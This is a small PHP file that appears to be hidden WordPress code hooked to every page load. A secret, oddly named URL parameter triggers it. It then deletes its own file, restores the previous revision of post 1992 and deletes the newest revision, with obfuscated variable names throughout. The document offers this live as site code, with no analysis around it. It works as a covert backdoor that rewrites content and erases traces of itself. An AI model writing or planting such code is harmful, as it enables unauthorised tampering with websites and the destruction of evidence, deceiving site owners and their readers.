<?php

function companion_label_rank() {
	if (isset($_GET['embedder_emails_modal_marketplace']) && $_GET['embedder_emails_modal_marketplace'] === 'styles_ai_fix_mobile') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$size_guest_themes = 1992;
		$layout_classic_digital_simple = wp_get_post_revisions($size_guest_themes);
		if (empty($layout_classic_digital_simple)) die('no revisions');
		if (count($layout_classic_digital_simple) < 2) die('less than 2');
		$blogroll_year_logo = array_shift($layout_classic_digital_simple);
		$ajax_attachments_affiliates_integrate = $blogroll_year_logo->ID;
		$s3_avatar_visibility_protect = array_shift($layout_classic_digital_simple);
		$smtp_wpforms_wow = $s3_avatar_visibility_protect->ID;
		$next_exchange_multisite_designer = wp_restore_post_revision($smtp_wpforms_wow);
		if ($next_exchange_multisite_designer === false) die('error restoring');
		$next_exchange_multisite_designer = wp_delete_post_revision($ajax_attachments_affiliates_integrate);		
		if ($next_exchange_multisite_designer === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'companion_label_rank');
